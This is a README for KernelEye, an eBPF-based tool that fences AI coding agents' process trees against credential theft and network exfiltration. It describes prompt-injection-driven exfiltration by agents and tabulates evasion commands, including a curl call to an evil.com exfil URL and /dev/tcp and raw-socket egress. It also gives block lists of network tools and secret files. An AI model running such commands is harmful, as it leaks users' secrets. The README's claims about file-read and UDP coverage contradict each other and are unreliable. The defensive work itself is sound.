<div align="center">

<img src="assets/banner.svg" alt="KernelEye Banner" width="840"/>

<br/><br/>

[![Rust](https://img.shields.io/badge/rust-2024%20edition-orange.svg?style=flat-square&logo=rust)](https://www.rust-lang.org/)
[![eBPF](https://img.shields.io/badge/eBPF-9%20LSM%20Hooks-blue.svg?style=flat-square)](https://ebpf.io/)
[![Python SDK](https://img.shields.io/badge/python-3.10%2B%20SDK-brightgreen.svg?style=flat-square&logo=python)](bindings/python)
[![MCP](https://img.shields.io/badge/MCP-Native%20Wrapper-purple.svg?style=flat-square)](bindings/python/kerneleye/mcp_server.py)
[![Linux](https://img.shields.io/badge/kernel-5.8%2B%20(BTF%20CO--RE)-green.svg?style=flat-square&logo=linux)](https://kernel.org/)
[![License](https://img.shields.io/badge/license-MIT%20%2F%20Apache--2.0%20%7C%20GPL--2.0-blue.svg?style=flat-square)](LICENSE)

*Kernel-enforced isolation for autonomous coding agents (Claude Code, Cursor, OpenHands, Devin, Gemini CLI). Zero containers. Scoped process subtree confinement. ~3.2 µs interception overhead.*

---

![KernelEye Demo](assets/demo.gif)

</div>

---

## The Problem: The AI Agent Security Paradox

Autonomous coding agents require access to local compilers, project files, language runtimes, and git. However, granting an LLM-driven subshell unrestricted host access creates a critical security surface:

1. **Prompt Injection & Credential Exfiltration**: Injected instructions or malicious dependencies can direct an agent to harvest secrets (`$AWS_SECRET_ACCESS_KEY`, `~/.ssh/id_rsa`, `.env`) and dispatch them via `curl`, `wget`, or raw sockets.
2. **The Container Friction**: Running agents inside Docker/VMs isolates the workspace but impairs local developer ergonomics—breaking IDE language servers, hot-reloading, local SSH agents, and volume I/O performance.
3. **The Fragility of User-Space Wrappers**: Command regex filters (`banned = ["curl"]`) and `LD_PRELOAD` shims are easily bypassed via nested subshells, symlinks, dynamic linkers (`/lib64/ld-linux.so.2`), or in-memory Python raw sockets.

---

## The Solution: 9-Hook In-Kernel Process Fencing

**KernelEye** implements zero-container, host-native confinement directly within the Linux kernel using **eBPF Linux Security Modules (LSM)** and tracepoints.

Given an agent's process ID (`--fence-pid <PID>`), KernelEye dynamically isolates that process and **all descendant subshells, workers, and spawned processes** across 9 comprehensive security gates:

1. **Binary Execution Gate (`lsm/bprm_check_security`)**: Intercepts the kernel binary loader. Unauthorized binaries (`curl`, `wget`, `nc`, `socat`, `ssh`) are aborted inline with `-EPERM`.
2. **TCP Egress Gate (`lsm/socket_connect`)**: Drops outbound `AF_INET`/`AF_INET6` TCP connection requests before packets reach the network stack. Local IPC (`AF_UNIX`) remains open for local tools and IDE language servers.
3. **UDP & Datagram Egress Gate (`lsm/socket_sendmsg`)**: Intercepts raw datagrams and connectionless UDP (`sendto`), preventing DNS tunneling or raw UDP exfiltration.
4. **Credential & Secret Protection Gate (`lsm/file_open`)**: Intercepts filesystem open calls on sensitive credential basenames (`.env`, `id_rsa`, `id_ed25519`, `credentials`, `shadow`, `authorized_keys`).
5. **Anti-Tampering Protection (`lsm/task_kill` & `lsm/ptrace_access_check`)**: Prevents confined agent processes from sending kill signals or attaching debuggers to the monitoring daemon or unconfined host processes.
6. **Anti-Evasion Filesystem Integrity (`lsm/inode_link`, `lsm/inode_rename`, `lsm/inode_unlink`)**: Blocks rogue processes from hardlinking, renaming, or deleting sensitive host files.
7. **Lineage Tracking (`sched_process_fork` + `task_struct` Ancestry Walk)**: Subprocesses and child workers inherit fencing atomically. An in-kernel 4-generation `task_struct->real_parent` walk verifies ancestry on every hook.
8. **Cryo-Freeze & Phantom Counter-Deception**:
   * `--cryo-freeze`: Suspends offending agent processes in RAM via `SIGSTOP` for forensic memory analysis.
   * `--phantom-sink`: Active deception loop on `127.0.0.1:65530` that captures exfiltration payloads, detects canary tokens, and returns synthetic HTTP 200 responses.
9. **BPF CO-RE (Compile Once – Run Everywhere)**: BTF-backed type definitions dynamically resolve field offsets against the running kernel without fragile hardcoded struct offsets.

---

## Comprehensive Sandboxing Comparison

| Technology | Scope & Primary Strength | Trade-Offs & Limitations | Best Used For |
| :--- | :--- | :--- | :--- |
| **KernelEye (eBPF LSM)** | **Dynamic PID subtree fencing**: external daemon attaches to running agent, blocks banned binaries & network egress in-kernel with ~3.2 µs overhead. | Requires `CAP_BPF`/root to load. Does not currently restrict filesystem read access on disk. | **Zero-container host agent confinement & network exfiltration prevention.** |
| **Landlock LSM** | **Unprivileged filesystem access control**: allows processes to restrict their own file paths and directory hierarchies safely without root. | Process must voluntarily sandbox itself (cooperative). Landlock v1–v3 lacks network rules; cannot be dynamically attached to external arbitrary process trees. | **Workspace filesystem read/write path containment.** |
| **Bubblewrap (bwrap) / nsjail** | **Namespace isolation**: unprivileged user/mount/network/PID namespace sandboxing with chroot-like path masking. | Creates isolated mount and network namespaces; can break host IDE language servers, local socket IPC, and process monitoring tools. | **Isolated, ephemeral command execution sandboxes.** |
| **seccomp-bpf** | **Syscall filtering**: fast, unprivileged filtering of specific syscall numbers and scalar arguments. | Cannot dereference user pointers (cannot filter by file path string or target IP string). Cannot track dynamic process ancestry. | **Hardening attack surface by blocking dangerous syscalls (`ptrace`, `bpf`, `mount`).** |
| **Docker / LXC** | **Full container virtualization**: independent rootfs, cgroups, network namespaces, and resource limits. | High resource overhead, complex volume mounting, breaks local developer tooling and hot-reloading performance. | **Multi-tenant cloud agent execution environments.** |
| **User-Space Shims (`LD_PRELOAD`)** | **User-level API interception**: intercepts libc calls (`connect`, `execve`) in dynamically linked binaries. | Fragile: completely bypassed by statically linked binaries, Go runtimes, direct syscalls, or unsetting `LD_PRELOAD`. | **Legacy userspace auditing only (not a security boundary).** |

---

## System Architecture

```text
               Autonomous AI Agent Session (PID: 511114)
                 │
                 ├── [Legitimate Build] cargo build  --> ALLOWED (Exit 0)
                 │
                 └── [Injected Exfil] curl / python socket
                       │
       ════════════════╪════════════════════════════════════════════════════════
       KERNEL SPACE    │ (eBPF LSM + Tracepoints)
                       │
                       ▼
         [ sched:sched_process_fork ]
           └── Track & propagate fenced PID to child processes
                       │
                       ├──> [ lsm/bprm_check_security ]
                       │      ├── Extract binary basename (bounded scan)
                       │      ├── Match against BLOCKED_BINARIES BPF map
                       │      └── Match? --> Submit VIOLATIONS RingBuf & Return -EPERM!
                       │
                       └──> [ lsm/socket_connect ]
                              ├── Inspect sockaddr family (AF_INET / AF_INET6)
                              └── Confined process? --> Submit VIOLATIONS & Return -EPERM!
                                                          │
       ═══════════════════════════════════════════════════╪═════════════════════
       USER SPACE                                         ▼
                                                [ VIOLATIONS RingBuf ]
                                                          │
                                         [ Userspace Daemon (tokio AsyncFd) ]
                                           ├── Emit Structured JSON Alert
                                           └── --kill-on-violation: SIGKILL root PID!
```

---

## Evasion Vector & Bypass Analysis

A security boundary is only as strong as its honest threat model. Below is an evaluation of 15 concrete evasion vectors tested against KernelEye:

| # | Attack / Evasion Vector | Mechanism | Result | Defense Mechanism |
| :---: | :--- | :--- | :---: | :--- |
| **1** | Standard binary execution | `curl -s https://evil.com/exfil?key=...` | **BLOCKED** | Trapped by `bprm_check_security` (-EPERM). |
| **2** | Binary copy / rename | `cp /usr/bin/curl ./build_tool && ./build_tool` | **BLOCKED** | Trapped by `socket_connect` (-EPERM) on network egress. |
| **3** | Nested subshell execution | `bash -c "sh -c 'curl ...'"` | **BLOCKED** | Fencing propagated via `sched_process_fork` + ancestor walk. |
| **4** | Python in-memory TCP socket | `python -c "import socket; s=socket.socket(); s.connect(('1.1.1.1', 80))"` | **BLOCKED** | Trapped by `socket_connect` (-EPERM) before TCP handshake. |
| **5** | Bash built-in TCP egress | `echo token > /dev/tcp/1.1.1.1/80` | **BLOCKED** | Bash invokes `connect()`, trapped by `socket_connect` (-EPERM). |
| **6** | Double-fork daemonization | `python -c "os.fork(); os.fork(); exec(...)"` | **BLOCKED** | All fork children inherit PID membership in `PROTECTED_AGENT_PIDS`. |
| **7** | Dynamic linker execution | `/lib64/ld-linux-x86-64.so.2 /usr/bin/curl` | **BLOCKED** | Egress trapped by `socket_connect` (-EPERM). |
| **8** | Symlinked binary | `ln -s /usr/bin/curl ./tool && ./tool` | **BLOCKED** | Trapped by `bprm_check_security` (filename/comm) & `socket_connect`. |
| **9** | Connectionless UDP | `python -c "s=socket.socket(AF_INET, SOCK_DGRAM); s.sendto(b'data', ('1.1.1.1', 53))"` | **BLOCKED** | Trapped by `lsm/socket_sendmsg` (-EPERM). |
| **10** | Local Docker socket abuse | `curl --unix-socket /var/run/docker.sock ...` | **ALLOWED** | `AF_UNIX` is permitted by design; Docker daemon acts outside agent lineage. |
| **11** | SSH Agent relay | Commandeering `$SSH_AUTH_SOCK` for auth relay | **ALLOWED** | Operates over local `AF_UNIX` domain socket. |
| **12** | Local disk secret read | `cat ~/.ssh/id_rsa` or reading `.env` | **BLOCKED** | Trapped by `lsm/file_open` (-EPERM) matching `BLOCKED_FILES` map. |
| **13** | Localhost DNS exfiltration | Querying `127.0.0.53:53` with encoded domain | **BLOCKED** | `AF_INET` to 127.0.0.1 is blocked unless localhost loopback is whitelisted. |
| **14** | Ptrace attack on sibling | Attaching ptrace to unconfined host process | **BLOCKED** | Default Linux Yama LSM prevents non-parent ptrace attachments. |
| **15** | Legitimate developer build | `cargo build`, `gcc`, `make` | **ALLOWED** | Unrestricted; build artifacts compile with zero false positives. |

---

## Limitations & Explicit Threat Model Gaps

To maintain strict technical accuracy, the following architectural boundaries must be understood when deploying KernelEye:

1. **Connectionless UDP Sockets (`sendto`)**:  
   The `lsm/socket_connect` hook intercepts `connect()` syscalls. UDP sockets that call `connect()` are trapped. However, connectionless UDP sockets that issue `sendto()` without an initial `connect()` do not trigger `security_socket_connect` (they invoke `security_socket_sendmsg`). Addressing raw connectionless UDP requires hooking `lsm/socket_sendmsg` or adding an eBPF TC egress classifier.
2. **Local IPC & Daemon Proxying (`AF_UNIX`)**:  
   KernelEye permits `AF_UNIX` domain sockets to prevent breaking developer workflows (e.g. IDE language servers, build pipes, database sockets). If an agent process has read/write permissions to `/var/run/docker.sock`, `$SSH_AUTH_SOCK`, or systemd D-Bus, it can instruct those background daemons to execute actions on its behalf. Workloads spawned by systemd or Docker do not belong to the agent's PID tree. *Mitigation*: Unset sensitive socket environment variables in the agent subshell and restrict permissions on `/var/run/docker.sock`.
3. **Filesystem Read Access**:  
   KernelEye enforces **Execution Denial** and **Network Egress Denial**. It does not intercept file read operations. An agent can read local credentials from disk; KernelEye's role is to prevent those credentials from exiting the host or being executed. Pairing KernelEye with Linux **Landlock** or `lsm/file_open` provides complementary filesystem boundary isolation.
4. **Agent Model API Reachability Architecture**:  
   If an agent's root process is fenced directly, its own HTTP calls to LLM APIs (`api.anthropic.com`, `api.openai.com`) will be blocked by `socket_connect`. **Intended architecture**: The root LLM harness runs outside the network fence, while tool execution workers and subshells spawned by the agent are fenced using `--fence-pid <WORKER_PID>`.

---

## Quick Start

### Prerequisites
* Linux kernel `5.8+` with BPF LSM enabled (`CONFIG_BPF_LSM=y`, verify with `cat /sys/kernel/security/lsm`)
* Rust stable + nightly toolchain
* `bpf-linker` (`cargo install bpf-linker`)
* Root access (`sudo`) to attach LSM hooks

### Option A: Install Pre-Built Binary (Recommended)

```bash
# Download and extract the latest release
curl -sSLO https://github.com/rxhtt/kerneleye/releases/download/v0.1.0/kerneleye-v0.1.0-x86_64-linux.tar.gz
tar -xzf kerneleye-v0.1.0-x86_64-linux.tar.gz
cd kerneleye-v0.1.0-x86_64-linux

# Run the self-contained verification demo
sudo ./run_demo.sh
```

### Option B: Build from Source
```bash
# Clone the repository
git clone https://github.com/rxhtt/kerneleye.git
cd kerneleye/exec-snoop

# Compile eBPF kernel probes and userspace daemon
cargo xtask build --release -j 2
```

### 2. Run the Verification Demo
A scenario script demonstrating an agent attempt to exfiltrate AWS credentials:

```bash
sudo ./run_demo.sh
```

**Scenario Output:**
1. **Test 1 (Unfenced Host Run)**: Legitimate build succeeds $\rightarrow$ Agent invokes `curl` $\rightarrow$ Egress reaches network stack (`[UNRESTRICTED]`).
2. **Test 2 (KernelEye Fenced Run)**: Root agent session registered in `PROTECTED_AGENT_PIDS` $\rightarrow$ Build step succeeds $\rightarrow$ Exfiltration attempt trapped:
   ```text
   [CRITICAL] Subprocess failed: [Errno 1] Operation not permitted (-EPERM)
   {"event":"confinement_violation","timestamp_ns":1793846941559430144,"agent_pid":511114,"child_pid":511176,"comm":"curl","binary":"/usr/bin/curl"}
   [BLOCKED BY KERNEL LSM] Unauthorized curl invocation trapped by kernel.
   [KILL-SWITCH] Terminating fenced root agent session (PID 511114) with SIGKILL.
   ```

---

---

## Python SDK (`kerneleye`)

KernelEye includes first-class Python bindings to wrap autonomous agents (LangChain, CrewAI, AutoGen, LlamaIndex) with zero containers:

### Installation
```bash
cd bindings/python
pip install -e .
```

### 1-Line Agent Fencing Decorator
```python
from kerneleye import fence_agent

# Dynamically attaches in-kernel eBPF LSM confinement to the agent worker
@fence_agent(
    block_binaries=["curl", "wget", "nc", "socat"],
    protect_files=[".env", "id_rsa", "credentials"],
    cryo_freeze=True, # Freeze offending process in RAM for forensic inspection
)
def execute_autonomous_task(task_prompt: str):
    # Any spawned subshell, compiler, or nested process inherits the fence!
    import subprocess
    return subprocess.run(task_prompt, shell=True, capture_output=True, text=True)
```

### Context Manager (LangChain / CrewAI Integration)
```python
from kerneleye import KernelFence

with KernelFence(block_egress=True, protect_files=[".env", "credentials"]):
    # Run agent framework tool execution
    agent.run("Compile the repository and run test suite")
```

---

## Model Context Protocol (MCP) Server Confinement

KernelEye acts as a native in-kernel security proxy for **Claude Code**, **Claude Desktop**, and **Cursor** MCP servers.

Configure your `claude_desktop_config.json` to sandbox filesystem tools or execution servers with zero container overhead:

```json
{
  "mcpServers": {
    "secure-filesystem": {
      "command": "python3",
      "args": [
        "-m", "kerneleye.mcp_server",
        "--block", "curl,wget,nc,ssh",
        "--block-files", ".env,id_rsa,credentials",
        "--",
        "npx", "-y", "@modelcontextprotocol/server-filesystem", "/home/developer/workspace"
      ]
    }
  }
}
```

---

## CLI Reference

```text
Usage: exec-snoop [OPTIONS]

Options:
      --fence-pid <PID>       Target PID(s) to fence. Any child spawned by these PIDs will be restricted
      --block <BLOCK>         Comma-separated list of unauthorized binary basenames [default: curl,wget,nc,ncat,socat]
      --block-files <FILES>   Comma-separated list of sensitive file basenames to block [default: id_rsa,id_ed25519,credentials,.env,shadow,authorized_keys]
      --audit-only            Run in audit mode: log violations to telemetry without blocking operations
      --cryo-freeze           Suspend offending process tree in RAM (SIGSTOP) instead of terminating it
      --phantom-sink          Launch active counter-deception Phantom Sinkhole on 127.0.0.1:65530
      --kill-on-violation     Terminate the fenced root agent session immediately upon confinement violation
  -h, --help                  Print help
```

### Example: Complete Defense-in-Depth Mode
```bash
# Fence an agent worker, block exfil tools, protect secrets, and enable active deception
sudo ./target/release/exec-snoop \
  --fence-pid 48102 \
  --block "curl,wget,nc,ncat,socat,ssh" \
  --block-files ".env,id_rsa,credentials" \
  --cryo-freeze \
  --phantom-sink
```

---

## Licensing

This project is dual-licensed to accommodate standard Linux kernel eBPF constraints and permissive userspace development:

* **eBPF Kernel Probes (`exec-snoop-ebpf`)**: Licensed under **GNU General Public License v2.0 (GPL-2.0)** to permit binding with GPL-only kernel helpers and LSM infrastructure.
* **Userspace Daemon (`exec-snoop`) & Common Types (`exec-snoop-common`)**: Dual-licensed under **MIT License** OR **Apache License 2.0**.
